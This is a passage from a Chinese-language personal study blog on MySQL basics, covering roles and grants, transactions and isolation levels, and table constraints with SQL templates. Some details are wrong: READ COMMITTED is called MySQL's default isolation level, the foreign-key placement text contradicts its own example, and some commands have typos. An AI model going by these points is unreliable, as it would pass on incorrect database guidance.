class="hljs-string">&#x27;角色名列表(,)&#x27;</span>;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.给角色赋权限&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">grant</span> 权限列表(,) <span class="hljs-keyword">on</span> 库名.表名 <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;角色名列表(,)&#x27;</span>;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.把角色分配给用户 &#x2F; 角色&#x3D;&#x3D;</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># 1. 把角色分配给角色</span><br>grant <span class="hljs-string">&#x27;角色名列表(,)&#x27;</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;角色名列表(,)&#x27;</span><span class="hljs-comment">;</span><br><br><br><span class="hljs-meta"># 2. 把角色分配给用户</span><br>grant <span class="hljs-string">&#x27;角色名列表(,)&#x27;</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机地址&#x27;</span>列表(,)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.将分配给用户的角色撤回&#x3D;&#x3D;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">revoke</span> <span class="hljs-string">&#x27;角色名列表(,)&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机地址&#x27;</span>列表(,);<br></code></pre></td></tr></table></figure><hr><h3 id="5-事务管理"><a href="#5-事务管理" class="headerlink" title="5. 事务管理"></a>5. 事务管理</h3><h4 id="5-1-事务的特性"><a href="#5-1-事务的特性" class="headerlink" title="5.1. 事务的特性"></a>5.1. 事务的特性</h4><ol><li>&#x3D;&#x3D;原子性&#x3D;&#x3D;<ol><li>事务中的所有操作要么全部执行成功，要么全部执行失败回滚。</li><li>对于数据库来说，事务是一个不可分割的最小操作单元。</li></ol></li><li>&#x3D;&#x3D;一致性&#x3D;&#x3D;：<ol><li>事务执行前后，数据库都处于一致的状态。</li><li>也就是说，事务执行前后，数据库的状态应该满足所有的定义约束、触发器、级联操作等。</li></ol></li><li>&#x3D;&#x3D;隔离性&#x3D;&#x3D;：<ol><li>事务的执行不会受到其他事务的干扰。</li><li>多个事务并发执行时，一个事务的中间状态对其他事务是不可见的。</li></ol></li><li>&#x3D;&#x3D;持久性&#x3D;&#x3D;：<ol><li>事务一旦提交，其结果就永久保存到数据库中。</li><li>即使系统发生故障，事务的结果也不会丢失。</li></ol></li></ol><hr><h4 id="5-2-事务提交的方式"><a href="#5-2-事务提交的方式" class="headerlink" title="5.2. 事务提交的方式"></a>5.2. 事务提交的方式</h4><p>一句话：我不管你是<strong>一次操作批量插入</strong>还是<strong>多次操作大量插入</strong>，只要涉及到多个数据，就给我开启手动提交：</p><ol><li>&#x3D;&#x3D;自动提交&#x3D;&#x3D;：<ol><li>在 MySQL 中，默认情况下，每条 SQL 语句都被视为一个独立的事务，并在执行后立即自动提交。</li><li>这意味着每条 SQL 语句执行后，数据库会自动处理提交，无需显式使用 <code>COMMIT</code> 命令。</li><li>在这种模式下，操作是独立的，无法将多个操作作为一个整体事务进行管理，需要一条一条的执行。</li></ol></li><li>&#x3D;&#x3D;手动提交&#x3D;&#x3D;：<ol><li>关闭自动提交，改为手动管理事务，使我们能够自行决定何时提交一组操作。如果其中任一操作失败，事务将回滚至初始状态，确保数据一致性。</li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>事务只对 DML 语句有影响，原因是：<ul><li>DQL 不受事务影响，因为 DQL 不会对数据库进行改变</li><li>DDL 和 DCL 不受事务一下，纯粹是事务管不到他们</li></ul></li></ol></blockquote><hr><h4 id="5-3-自动提交事务"><a href="#5-3-自动提交事务" class="headerlink" title="5.3. 自动提交事务"></a>5.3. 自动提交事务</h4><p>在 MySQL 中，默认启用了自动提交模式：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 1. 查询是否开启自动提交（1开，0关）</span><br><span class="hljs-attribute">select</span> @<span class="hljs-variable">@autocommit</span>;<br><br><br><span class="hljs-comment"># 2. 开启自动提交</span><br><span class="hljs-attribute">set</span> autocommit = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><hr><h4 id="5-4-手动提交事务"><a href="#5-4-手动提交事务" class="headerlink" title="5.4. 手动提交事务"></a>5.4. 手动提交事务</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 1. 查询是否开启自动提交（1开，0关）</span><br><span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>@autocommit;<br><br><br><span class="hljs-comment"># 2. 关闭自动提交</span><br><span class="hljs-built_in">set</span> autocommit = <span class="hljs-number">0</span>;<br><br><br><span class="hljs-comment"># 3. 开始事务</span><br><span class="hljs-built_in">start</span> transaction; / <span class="hljs-keyword">begin</span>;<br><br><br><span class="hljs-comment"># 4. 执行 SQL 操作</span><br>UPDATE accounts <span class="hljs-built_in">SET</span> balance = balance - <span class="hljs-number">100</span> <span class="hljs-built_in">WHERE</span> id = <span class="hljs-number">1</span>;<br>UPDATE accounts <span class="hljs-built_in">SET</span> balance = balance + <span class="hljs-number">100</span> <span class="hljs-built_in">WHERE</span> id = <span class="hljs-number">2</span>;<br><br><br><span class="hljs-comment"># 5. 提交事务 / 回滚事务</span><br><span class="hljs-comment"># 5.1. 提交事务（将事务中的所有操作永久保存到数据库中）</span><br>commit;<br><br><span class="hljs-comment"># 5.2. 回滚事务（撤销事务中的所有操作）</span><br>rollback;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>在 SQL 中，<code>commit</code> 和 <code>rollback</code> 是互斥的，一个事务只能执行其中一个</li><li>我们通常是使用编程语言来控制的，成功了就提交，不成功就回滚</li></ol></blockquote><hr><h4 id="5-5-事务隔离性问题"><a href="#5-5-事务隔离性问题" class="headerlink" title="5.5. 事务隔离性问题"></a>5.5. 事务隔离性问题</h4><p>以下这三种现象看似与 <strong>查询操作</strong> 相关，但它们本质上是由于 <strong>事务隔离性</strong> 不足，导致<strong>并发事务</strong>之间在数据访问和修改时发生 <strong>冲突</strong>。</p><ol><li>&#x3D;&#x3D;脏读&#x3D;&#x3D;：<ol><li>假设事务 A 正在对某些数据进行增删改操作，但尚未提交，事务 B 需要读取这些数据。如果事务 B 正好读取了事务 A 正在修改的数据，则事务 B 读取到的数据就是 “脏” 的。</li><li>这些数据被称为“脏数据”，因为事务 A 可能在后续回滚或再次修改，导致事务 B 读取到的数据实际上未被最终提交，可能会导致错误的业务逻辑，尤其是事务 B 后续依赖这些数据时。</li></ol></li><li>&#x3D;&#x3D;不可重复读&#x3D;&#x3D;：<ol><li>发生在 <strong>同一事务</strong> 内 <strong>多次查询</strong> <strong>同一行数据</strong> 时。</li><li>例如，事务 B 初次查询某行数据，然后事务 A 对这行数据进行了<strong>修改</strong>或<strong>删除</strong>。如果事务 B 再次查询同一行数据，会发现读取到的数据发生了变化，导致 <strong>不可重复读</strong>。</li></ol></li><li>&#x3D;&#x3D;幻读&#x3D;&#x3D;：<ol><li>发生在 <strong>同一事务</strong> 内 <strong>多次查询</strong> <strong>结果集</strong> 时</li><li>例如，事务 B 查询某个条件范围的数据（如 <code>age &gt; 50</code>），然后事务 A 向该范围内<strong>插入</strong>数据。事务 B 再次查询时，发现数据集发生了变化，查询结果与第一次查询不同，这就是 <strong>幻读</strong>。（只有插入才会导致幻读，更新、删除不会导致幻读）</li></ol></li></ol><hr><h4 id="5-6-事务隔离级别"><a href="#5-6-事务隔离级别" class="headerlink" title="5.6. 事务隔离级别"></a>5.6. 事务隔离级别</h4><h5 id="5-6-1-READ-UNCOMMITTED（读未提交）"><a href="#5-6-1-READ-UNCOMMITTED（读未提交）" class="headerlink" title="5.6.1. READ UNCOMMITTED（读未提交）"></a>5.6.1. READ UNCOMMITTED（读未提交）</h5><ol><li>&#x3D;&#x3D;执行 查询 语句&#x3D;&#x3D;：<ol><li>查询语句本身不会对数据加锁，因此其他事务仍然可以对相关数据执行增删改查操作，可能导致 <strong>不可重复读</strong> 和 <strong>幻读</strong></li><li>如果查询的数据正好被其他事务修改，则会发生发生 <strong>脏读</strong></li><li>简单来说：查询有 脏读、不可重复读、幻读 问题</li></ol></li><li>&#x3D;&#x3D;执行 增、删、改 语句&#x3D;&#x3D;：<ol><li>对操作的数据，会加上行级排他锁（X锁），防止其他事务对这些数据进行增删改操作（可以读取数据，具体是进行脏读还是读取已提交的版本，取决于它的事务的隔离级别）。X锁会一直保持，直到事务结束（提交或回滚）时释放</li><li>如果数据正在被其他事务操作且已加锁，会产生锁冲突，当前事务会等待对方事务结束（提交或回滚），然后再加锁并执行操作。</li><li>如果数据未被锁定，则可以直接进行增删改操作。</li></ol></li><li>&#x3D;&#x3D;使用场景&#x3D;&#x3D;:<ol><li>数据一致性要求不高，性能最高</li></ol></li></ol><hr><h5 id="5-6-2-READ-COMMITTED（读已提交，默认）"><a href="#5-6-2-READ-COMMITTED（读已提交，默认）" class="headerlink" title="5.6.2. READ COMMITTED（读已提交，默认）"></a>5.6.2. READ COMMITTED（读已提交，默认）</h5><ol><li>&#x3D;&#x3D;执行 查询 语句&#x3D;&#x3D;：<ol><li>查询语句<strong>不会对数据加锁</strong>，因此其他事务仍然可以对相关数据执行增删改查操作，可能导致 <strong>不可重复读</strong> 和 <strong>幻读</strong></li><li>查询语句<strong>仅读取其他事务已提交的最新数据版本</strong>（<strong>避免脏读</strong>，不会等待提交，直接找最近提交的）。</li><li>简单来说：查询有 不可重复读、幻读 问题</li></ol></li><li>&#x3D;&#x3D;执行 增、删、改 语句&#x3D;&#x3D;：<ol><li>对操作的数据，会加上<strong>行级排他锁（X锁）</strong>，防止其他事务对这些数据进行增删改操作（可以读取数据，具体是进行脏读还是读取已提交的版本，取决于它的事务的隔离级别）。X锁会一直保持，直到事务结束（提交或回滚）时释放</li><li>如果数据正在被其他事务操作且已加锁，会产生锁冲突，当前事务会等待对方事务结束（提交或回滚），然后再加锁并执行操作。</li><li>如果数据未被锁定，则可以直接进行增删改操作。</li></ol></li><li>&#x3D;&#x3D;使用场景&#x3D;&#x3D;：<ol><li>数据库的默认隔离级别，日常用这个就行，不可重复读、幻读这些都是小问题，谁还真一次事务执行多次查询啊</li></ol></li></ol><hr><h5 id="5-6-3-REPEATABLE-READ（可重复读）"><a href="#5-6-3-REPEATABLE-READ（可重复读）" class="headerlink" title="5.6.3. REPEATABLE READ（可重复读）"></a>5.6.3. REPEATABLE READ（可重复读）</h5><ol><li>&#x3D;&#x3D;执行 查询 语句&#x3D;&#x3D;：<ol><li>查询语句虽然<strong>不会对数据加锁</strong>，因此其他事务仍然可以对相关数据执行增删改查操作</li><li><strong>但会</strong>在首次查询时创建一个 <strong>一致性数据快照</strong>。后续的查询将基于此快照进行，确保数据一致性。<ol><li>如果其他事务对数据进行删除或修改操作，这些变动不会影响快照的内容。因此，后续查询结果与第一次查询一致，避免了<strong>不可重复读</strong>。</li><li>然而，<strong>幻读</strong>仍然可能发生。若其他事务插入了符合查询条件的新记录（例如，<code>age &gt; 25</code>），那么在事务 A 下一次查询时，新增的记录会出现在查询结果中，导致两次查询结果不同，从而产生<strong>幻读</strong>。</li></ol></li><li>查询语句<strong>仅读取其他事务已提交的最新数据版本</strong>（<strong>避免脏读</strong>，不会等待提交，直接找最近提交的）。</li><li>简单来说：查询有 幻读 问题</li></ol></li><li>&#x3D;&#x3D;执行 增、删、该 语句&#x3D;&#x3D;：<ol><li>对操作数据加<strong>行级排他锁（X锁）</strong>，并对<strong>数据范围</strong>的 <strong>“间隙” 加锁</strong>（例如，当 <code>WHERE id &gt; 100</code> 时，锁定 <code>id &gt; 100</code> 的区间，注意是区间，不是行数据），以阻止其他事务插入或修改该区间的数据（可以读取数据，具体是进行脏读还是读取已提交的版本，取决于它的事务的隔离级别）</li><li>如果数据正在被其他事务操作且已加锁，会产生锁冲突，当前事务会等待对方事务结束（提交或回滚），然后再加锁并执行操作。</li><li>如果数据未被锁定，则可以直接进行增删改操作。</li></ol></li><li>&#x3D;&#x3D;使用场景&#x3D;&#x3D;：<ol><li>一致性较高</li></ol></li></ol><hr><h5 id="5-6-4-SERIALIZABLE（可串行化）"><a href="#5-6-4-SERIALIZABLE（可串行化）" class="headerlink" title="5.6.4. SERIALIZABLE（可串行化）"></a>5.6.4. SERIALIZABLE（可串行化）</h5><ol><li>&#x3D;&#x3D;执行 查询 语句&#x3D;&#x3D;：<ol><li>查询语句会对数据加 共享锁（S锁），并对<strong>数据范围</strong>的 <strong>“间隙” 加锁</strong>（例如，当 <code>WHERE id &gt; 100</code> 时，锁定 <code>id &gt; 100</code> 的区间，注意是区间，不是行数据）以阻止其他事务插入或修改该区间的数据（可以读取数据，具体是进行脏读还是读取已提交的版本，取决于它的事务的隔离级别）</li><li>若使用索引查询，锁定匹配的索引范围和间隙</li><li>若全表扫描，可能直接加表级锁</li><li>简单来说：查询无 脏读、不可重复度、幻读 问题</li></ol></li><li>&#x3D;&#x3D;执行 增、删、该 语句&#x3D;&#x3D;：<ol><li>对操作数据加<strong>行级排他锁（X锁）</strong>，并对<strong>数据范围</strong>的 <strong>“间隙” 加锁</strong>（例如，当 <code>WHERE id &gt; 100</code> 时，锁定 <code>id &gt; 100</code> 的区间，注意是区间，不是行数据），以阻止其他事务插入或修改该区间的数据（可以读取数据，具体是进行脏读还是读取已提交的版本，取决于它的事务的隔离级别）</li><li>如果数据正在被其他事务操作且已加锁，会产生锁冲突，当前事务会等待对方事务结束（提交或回滚），然后再加锁并执行操作。</li><li>如果数据未被锁定，则可以直接进行增删改操作。</li></ol></li><li>&#x3D;&#x3D;使用场景&#x3D;&#x3D;：<ol><li>一致性最高，性能最低</li></ol></li></ol><hr><h3 id="6-数据分区"><a href="#6-数据分区" class="headerlink" title="6. 数据分区"></a>6. 数据分区</h3><hr><h3 id="7-MySQL-约束"><a href="#7-MySQL-约束" class="headerlink" title="7. MySQL 约束"></a>7. MySQL 约束</h3><h4 id="7-1-约束概述"><a href="#7-1-约束概述" class="headerlink" title="7.1. 约束概述"></a>7.1. 约束概述</h4><p>约束是数据库中用于限制和控制<strong>列上数据</strong>完整性的一种规则。</p><p>我的策略是：除了主键约束，其他约束都在表创建后再添加约束。</p><hr><h4 id="7-2-常用约束"><a href="#7-2-常用约束" class="headerlink" title="7.2. 常用约束"></a>7.2. 常用约束</h4><p>&#x3D;&#x3D;1.主键约束&#x3D;&#x3D;</p><table><thead><tr><th>约束类型</th><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td><strong>主键约束</strong></td><td><code>PRIMARY KEY</code></td><td>用于确保列中的每个<strong>值唯一</strong>且<strong>不能为空</strong>，通常主键列还会<strong>设置自增属性</strong>以便自动生成唯一值。每个表只能有一个主键。<br></td></tr><tr><td><strong>自增属性</strong></td><td><code>AUTO_INCREMENT</code></td><td>不是传统意义上的约束，而是一种属性，用于为整数类型的列设置自增功能，自动为该列生成唯一的数字值。<strong>通常用于主键列。</strong><br></td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 主键约束<br># <span class="hljs-number">1.1</span>. 添加主键约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> &lt;<span class="hljs-keyword">constraint</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">primary key</span> (&lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt;);<br><br># <span class="hljs-number">1.2</span>. 删除主键约束（自动删除唯一索引）<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">primary key</span>;<br><br><br># <span class="hljs-number">2.</span> 自增属性<br># <span class="hljs-number">2.1</span>. 添加自增属性<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; modify &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; &lt;data-<span class="hljs-keyword">type</span>&gt; auto_increment;<br><br># <span class="hljs-number">2.2</span>. 删除自增属性<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; modify &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; &lt;data-<span class="hljs-keyword">type</span>&gt;;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：</p><ol><li>主键约束会自动添加 <strong>非空约束</strong> 和 <strong>唯一约束</strong>，并创建 <strong>主键索引</strong>（该索引本身也是唯一索引的一种形式，因此保证了每个值的唯一性）。通常情况下，主键列还会设置为 <strong>自增</strong> 属性。</li><li>自增属性仅适用于<strong>数值类型</strong>的列</li><li><code>constraint-name</code> 是我们为约束起的约束名称，方便后续维护和开发</li><li><code>data-type</code> 中要写具体的数值类型，例如是 <code>int</code> 还是 <code>bigint</code></li></ol></blockquote><p>&#x3D;&#x3D;2.外键约束&#x3D;&#x3D;</p><table><thead><tr><th>约束类型</th><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td><strong>外键约束</strong><br></td><td><code>FOREIGN KEY</code><br></td><td>让两张表的列中数据之间产生连接<br></td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 添加外键约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> &lt;<span class="hljs-keyword">constraint</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">foreign key</span> (&lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt;) <span class="hljs-keyword">references</span> &lt;referenced-<span class="hljs-keyword">table</span>&gt; (&lt;referenced-<span class="hljs-keyword">column</span>&gt;) [<span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> 更新行为] [<span class="hljs-keyword">ON</span> <span class="hljs-keyword">DELETE</span> 删除行为];<br><br><br># <span class="hljs-number">2.</span> 删除外键约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">foreign key</span> &lt;<span class="hljs-keyword">constraint</span>-<span class="hljs-type">name</span>&gt;;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.普通约束&#x3D;&#x3D;</p><table><thead><tr><th><strong>约束类型</strong></th><th><strong>关键字</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>唯一约束</strong></td><td><code>UNIQUE</code></td><td>用于确保列中的值<strong>在表中是唯一</strong>的，允许 <code>NULL</code> 值。</td></tr><tr><td><strong>检查约束</strong></td><td><code>CHECK</code></td><td>用于确保列中的值满足特定的条件或表达式。在 MySQL 8.0 及以上版本支持。</td></tr><tr><td><strong>非空约束</strong></td><td><code>NOT NULL</code></td><td>用于确保列中的值不能为 <code>NULL</code>。</td></tr><tr><td><strong>默认值约束</strong></td><td><code>DEFAULT</code></td><td>用于为列设置默认值，如果插入数据时没有指定该列的值，数据库将自动使用默认值。</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 唯一约束（☆☆☆）<br># <span class="hljs-number">1.1</span>. 添加唯一约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> &lt;<span class="hljs-keyword">constraint</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">unique</span> (&lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt;);<br><br># <span class="hljs-number">1.2</span>. 删除唯一约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">index</span> &lt;<span class="hljs-keyword">constraint</span>-<span class="hljs-type">name</span>&gt;;<br><br><br># <span class="hljs-number">2.</span> 检查约束<br># <span class="hljs-number">2.1</span>. 添加检查约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> &lt;<span class="hljs-keyword">constraint</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">check</span> (&lt;condition&gt;);<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> &lt;<span class="hljs-keyword">constraint</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">check</span> (&lt;column1-<span class="hljs-type">name</span>&gt; &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> &lt;column2-<span class="hljs-type">name</span>&gt; &lt; <span class="hljs-number">100</span>);<br><br># <span class="hljs-number">2.2</span>. 删除检查约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">check</span> &lt;<span class="hljs-keyword">constraint</span>-<span class="hljs-type">name</span>&gt;;<br><br><br># <span class="hljs-number">3.</span> 非空约束<br># <span class="hljs-number">3.1</span>. 添加非空约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; modify &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; &lt;data-<span class="hljs-keyword">type</span>&gt; <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>;<br><br># <span class="hljs-number">3.2</span>. 删除非空约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt;modify &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; &lt;data-<span class="hljs-keyword">type</span>&gt; <span class="hljs-keyword">null</span>;<br><br><br># <span class="hljs-number">4.</span> 默认值约束<br># <span class="hljs-number">4.1</span>. 添加默认值约束<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; modify &lt;<span class="hljs-built_in">column_name</span>&gt; &lt;data_type&gt; <span class="hljs-keyword">default</span> &lt;default_value&gt;;<br><br># <span class="hljs-number">4.2</span>. 删除默认值约束<br>allter <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; modify &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; &lt;data_type&gt;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>特别注意 <strong>唯一约束</strong>，因为唯一约束会自动创建 <strong>唯一索引</strong>，因此命令稍有不同。其他三种约束命令上差异不大。</li><li>要修改约束，我们先删除旧约束，再添加新约束</li></ol></blockquote><hr><h4 id="7-3-补充：外键约束"><a href="#7-3-补充：外键约束" class="headerlink" title="7.3. 补充：外键约束"></a>7.3. 补充：外键约束</h4><h5 id="7-3-1-外键约束建立原则"><a href="#7-3-1-外键约束建立原则" class="headerlink" title="7.3.1. 外键约束建立原则"></a>7.3.1. 外键约束建立原则</h5><p>外键约束<strong>定义在从表</strong>中，用于<strong>引用主表的主键或唯一键</strong>。</p><hr><h5 id="7-3-2-一对一关系"><a href="#7-3-2-一对一关系" class="headerlink" title="7.3.2. 一对一关系"></a>7.3.2. 一对一关系</h5><p>在一对一关系中，两个表中的每一行记录都与另一个表中的一行记录相关联。例如，一个员工对应一个工作证，每个工作证对应一个员工。</p><p>在一对一关系中，通常选择<strong>列较少的表作为主表</strong>，<strong>列较多的表作为从表</strong>，并在主表上建立外键。</p><p>以 <code>Employee</code> 表和 <code>WorkCard</code> 表为例，<code>Employee</code> 表中的每个员工都有一个唯一的 <code>EmpID</code>，而 <code>WorkCard</code> 表中的每个工作证都对应一个唯一的员工。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> Employee 表（主表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Employee (<br>    EmpID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    <span class="hljs-type">Name</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)<br>);<br><br><br># <span class="hljs-number">2.</span> WorkCard 表（从表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> WorkCard (<br>    CardID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    EmpID <span class="hljs-type">INT</span>, // 从表的外键字段 -&gt; 主表的字段（一般命名相同）<br>    IssueDate <span class="hljs-type">DATE</span>,<br>    <span class="hljs-keyword">FOREIGN KEY</span> (EmpID) <span class="hljs-keyword">REFERENCES</span> Employee(EmpID)<br>);<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250521211043750.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250521211108505.png"></p><blockquote><p>[!NOTE] 注意事项：</p><ol><li>删除数据时，先删除从表数据，再删除主表数据</li><li>插入数据时，先插入主表数据，再插入从表</li></ol></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 先插入 Employee 表（主表）数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Employee (EmpID, <span class="hljs-type">Name</span>) <br><span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;John Doe&#x27;</span>);<br><br><br># <span class="hljs-number">2.</span> 再插入 WorkCard 表（从表）数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> WorkCard 